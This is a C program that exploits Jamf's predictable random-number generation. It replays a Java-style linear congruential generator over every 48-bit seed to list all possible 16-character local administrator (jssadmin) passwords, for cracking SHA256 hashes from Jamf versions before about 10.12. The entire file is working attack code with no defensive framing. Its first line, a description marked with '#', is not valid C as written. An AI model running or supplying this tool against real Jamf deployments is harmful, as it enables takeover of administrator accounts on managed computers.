#include <stdio.h>

# Generates all possible jamf local administrative passwords to crack local jssadmin SHA256 hashes in Jamf prior to ~10.12

long long seed = 0L;

char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
#define CHARSETLEN 62
#define MASK (1L << 48) - 1
#define PASSWORDLENGTH 16
#define ADDEND 0xBL
#define MULTIPLIER 0x5DEECE66DL

long next31() {
    long long oldseed, nextseed;
    oldseed = seed;
    nextseed = ((oldseed * MULTIPLIER) + ADDEND) & MASK;
    seed = nextseed;
    return (long)(nextseed >> (48 - 31));
}

long nextInt() {
   long r = next31();
   long m = CHARSETLEN - 1;
   for (long u = r;
        u - (r = u % CHARSETLEN) + m < 0;
        u = next31());
   return r;
}

void randomPassword(long long uniq) {
   seed = uniq & MASK;

   char buffer[PASSWORDLENGTH+1];
   buffer[PASSWORDLENGTH] = 10;

   for (int i = 0; i < PASSWORDLENGTH; i++)
      buffer[i] = charset[nextInt()];

   fwrite(buffer, 1, PASSWORDLENGTH+1, stdout);
 }


int main() {

   unsigned long long nano = 0;
   for (nano = 1L; nano < MASK; nano++)
       randomPassword(nano);

}
